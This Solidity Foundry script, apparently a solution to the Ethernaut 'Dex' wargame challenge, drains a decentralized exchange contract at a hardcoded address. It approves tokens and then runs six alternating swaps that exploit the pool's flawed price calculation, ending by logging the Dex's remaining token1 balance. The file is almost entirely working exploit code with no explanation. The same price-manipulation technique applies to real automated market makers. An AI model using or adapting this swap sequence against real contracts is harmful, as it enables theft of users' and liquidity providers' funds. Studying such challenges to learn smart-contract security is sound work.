// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";
import {DeployAttackScript} from "./Deploy.s.sol";

contract AttackScript is Script {
    function run() external{

        // DeployAttackScript deployAttackScript = new DeployAttackScript();
        // // Dex dex = Dex(0x8eee504c186c491a7d4f27FA7011eC8E7ec552DE);
        // (Dex dex, , ) = deployAttackScript.run();


        vm.startBroadcast();

        // Dex dex = new Dex();
        Dex dex = Dex(0x8eee504c186c491a7d4f27FA7011eC8E7ec552DE);

        dex.approve(address(dex), 500);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        console.log("Final token1 balance of Dex is : ", dex.balanceOf(token1, address(dex)));
        
        vm.stopBroadcast();
    }
}
